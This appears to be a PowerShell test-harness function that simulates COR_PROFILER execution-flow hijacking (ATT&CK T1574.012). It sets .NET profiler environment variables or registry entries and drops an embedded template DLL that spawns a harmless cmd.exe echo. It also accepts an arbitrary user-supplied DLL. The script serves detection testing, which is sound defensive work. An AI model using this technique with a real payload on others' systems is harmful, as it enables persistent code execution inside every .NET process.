#region local helper functions. Do not export.
function Get-EnvVar {
    param (
        [string]$EnvVar,
        [string]$Scope
    )      
    return [Environment]::GetEnvironmentVariable($EnvVar, [EnvironmentVariableTarget]::$Scope)
}
function Set-EnvVar {
    param (
        [string]$EnvVar,
        [string]$Scope,
        [string]$EnvVarValue
    )
    Write-Verbose ([string]::Format("Setting {0} {1} scope environment variable to {2}", $EnvVar, $ProfilerScope, $EnvVarValue))
    [Environment]::SetEnvironmentVariable($EnvVar, $EnvVarValue, [EnvironmentVariableTarget]::$Scope)
}
function Remove-EnvVar {
    param (
        [string]$EnvVar,
        [string]$Scope
    )
    Write-Verbose ([string]::Format("Removing {0} {1} scope environment variable", $EnvVar, $ProfilerScope))
    [Environment]::SetEnvironmentVariable($EnvVar, $null, [EnvironmentVariableTarget]::$Scope)
}

function Resolve-ProfilerPath {
    param (
    [string]$InputPath
    )
    # Resolve the full path of the profiler DLL. Relative and absolute paths should be accepted.
    $ProfilerPathParentDirectory = Split-Path -Path $InputPath -Parent
    $ProfilerPathFileName = Split-Path -Path $InputPath -Leaf

    if (('' -eq $ProfilerPathParentDirectory) -or ('.' -eq $ProfilerPathParentDirectory)) {
        # Use the current working directory is an explicit directory is not supplied.
        $ProfilerPathParentDirectory = $PWD.Path
    }

    $ResolvedProfilerPath = Join-Path -Path $ProfilerPathParentDirectory -ChildPath $ProfilerPathFileName
    Write-Verbose ([string]::Format("Resolved profiler path: {0}", $ResolvedProfilerPath))

    return $ResolvedProfilerPath
}
#endregion

function Invoke-ATHCORProfiler {
<#
.SYNOPSIS

Test runner for "COR_PROFILER" execution flow hijacking.

Technique ID: T1574.012 (Hijack Execution Flow)

.DESCRIPTION

Invoke-ATHCORProfiler sets environment variables required to load a profiling DLL capable of executing arbitrary unmanged code in the context of a process that loads the .NET Common Language Runtime (CLR).

.PARAMETER ProfilerPath

Specifies the file name or full file path to a profiler DLL to be used. If this parameter is not supplied a template profiler DLL is written to disk which executes "cmd.exe /c echo AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA & timeout 5" when the CLR attaches the profiler.

.PARAMETER RegistrationFreeProfilerScope

Specifies a "Registration Free" profiler will be configured by setting the COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH environment variables. This type of profiler is supported with versions of the .NET Framework 4+.

Registration free profilers support Machine, User, and Process scoped environment variables. Machine scoped profilers will attach anytime a process on the machine loads the .NET CLR. Similarly, User scoped profilers will attach only in the current user context and Process scoped profilers will only attach to the current PowerShell process and any child processes.

.PARAMETER RegisteredProfilerScope

Specifies the profiler should be registered in addition to setting the COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH environment variables. This allows backwards compatibility with older versions of the .NET Framework. Only Machine and User scoped profilers can be registered.

.PARAMETER ProfilerCLSID

Optionally, specify a CLSID to be used for the COR_PROFILER environment variable and the COM CLSID for registered profilers.

.PARAMETER TestGuid

Optionally, specify a test GUID value to use to override the generated test GUID behavior.

.PARAMETER Force

Specifies any existing environment variables should be overwritten. 

.OUTPUTS

PSObject

Outputs an object consisting of relevant execution details. The following object properties may be populated:

* TechniqueID - Specifies the relevant MITRE ATT&CK Technique ID.
* TestSuccess - Will be set to True if it was determined that the technique executed successfully. Invoke-ATHCORProfiler can only confidently determine success when using the template profiler DLL (i.e. when -ProfilerPath is not supplied). In this scenario, a template profiler DLL spawns a specific instance of cmd.exe to validate successful execution.
* TestGuid - Specifies the test GUID that was used for the test.
* ProfilerScope - Specifies the environment variabe scope and influence of the profiler.
* ProfilerType - The type of profiler used. Either RegistrationFree or Registered.
* ProfilerCLSID - Specifies the COR_PROFILER CLSID for both registration free and registered profilers. For registered profilers this is also the COM CLSID that was used.
* ProfilerDllPath - Specifies the full path on disk of the profiler DLL.
* ProfilerDllFileSHA256Hash - The SHA256 checksum of the profiler DLL.
* TargetProcessId - Specifies the process ID of the target PowerShell process.
* TargetProcessPath - Specifies the full path to the target PowerShell process.
* TargetProcessCommandLine - Specifies the target PowerShell process command line.
* ChildProcessId - Specifies the cmd.exe child process ID.
* ChildProcessCommandLine - Specifies the cmd.exe child process command line.
* RegisteredProfilerRegistryCOMClassValueName - If the profiler is registered, the path to the profiler value name.
* RegisteredProfilerRegistryCOMClassNameValue - If the profiler is registered, the path to the profiler name value.
* CorEnableProfilingEnvVarRegistrySubKey - The registry key the COR_ENABLE_PROFILING environment variable value name is stored.       
* CorEnableProfilingEnvVarRegistryValueName - The registry value name, i.e. COR_ENABLE_PROFILING. 
* CorEnableProfilingEnvVarRegistryNameValue - The COR_ENABLE_PROFILING name value.
* CorProfilerEnvVarRegistrySubKey -The registry key the COR_PROFILER environment variable value name is stored.         
* CorProfilerEnvVarRegistryValueName - The registry value name, i.e. COR_PROFILER.        
* CorProfilerEnvVarRegistryNameValue - The COR_PROFILER name value.       
* CorProfilerPathEnvVarRegistrySubKey - The registry key the COR_PROFILER_PATH environment variable value name is stored.   
* CorProfilerPathEnvVarRegistryValueName - The registry value name, i.e. COR_PROFILER_PATH.   
* CorProfilerPathEnvVarRegistryNameValue - The COR_PROFILER_PATH name value.

.EXAMPLE

Invoke-ATHCORProfiler

Write a template profiler DLL to disk and configure a User scoped registration free profiler.

.EXAMPLE

Invoke-ATHCORProfiler -RegisteredProfilerScope Machine

Write a template profiler DLL to disk and configure a registered machine scoped profiler.

.EXAMPLE

Invoke-ATHCORProfiler -ProfilerPath C:\Path\To\Profiler.dll -RegistrationFreeProfilerScope Process

Specify a user supplied profiler and configure a registration free Process scoped profiler.
#>

    [CmdletBinding(DefaultParameterSetName = 'RegistrationFreeProvider')]
    param (
        [Parameter(ParameterSetName = 'RegistrationFreeProvider')]
        [Parameter(ParameterSetName = 'RegisteredProvider')]
        [Guid]
        $ProfilerCLSID = (New-Guid),

        [Parameter(Mandatory=$true, ParameterSetName = 'RegisteredProvider')]
        [String]
        [ValidateSet('Machine', 'User')]
        $RegisteredProfilerScope = 'User',

        [Parameter(ParameterSetName = 'RegistrationFreeProvider')]
        [String]
        [ValidateSet('Machine', 'User', 'Process')]
        $RegistrationFreeProfilerScope = 'User',
        
        [Guid]
        $TestGuid = (New-Guid),

        [String]
        $ProfilerPath = $null,

        [Switch]
        $Force 
    )

    switch ($PSCmdlet.ParameterSetName) {
        'RegistrationFreeProvider'      { $ProfilerType = 'RegistrationFree' }
        'RegisteredProvider'            { $ProfilerType = 'Registered' }
    }
    if ($ProfilerType -eq 'Registered') {
        $ProfilerScope = $RegisteredProfilerScope
    } else {
        $ProfilerScope = $RegistrationFreeProfilerScope
    }

    # If the Profiler Scope is set to Machine ensure we have the requisit permissions.
    if ((($RegisteredProfilerScope -eq "Machine") -or ($RegistrationFreeProfilerScope -eq "Machine")) -and -not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Error "In order to set Machine scoped environment variables this module needs to execute with elevated permissions. e.g. A member of the Administrators group."
        return
    }

    # Template dll that spawns powershell.exe when -ProfilerPath is not supplied.
    # SHA256 Hash: 634cf98c2df65a46c649be4f41e74a4b28f28516a1f42fc819c44a5ba8d29b46
    # VirusTotal Analysis: https://www.virustotal.com/gui/file/634cf98c2df65a46c649be4f41e74a4b28f28516a1f42fc819c44a5ba8d29b46/detection
    <# C code used to generate the template dll below:
        #include "pch.h"

        BOOL APIENTRY DllMain(HMODULE hModule,
            DWORD  ul_reason_for_call,
            LPVOID lpReserved
        )
        {
            switch (ul_reason_for_call)
            {
            case DLL_PROCESS_ATTACH:
                WinExec("cmd.exe /c echo AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA & timeout 5", SW_SHOWNORMAL);
            case DLL_THREAD_ATTACH:
            case DLL_THREAD_DETACH:
            case DLL_PROCESS_DETACH:
                break;
            }
            return TRUE;
        }
    #>

    $TemplateSourceBytes = [Convert]::FromBase64String('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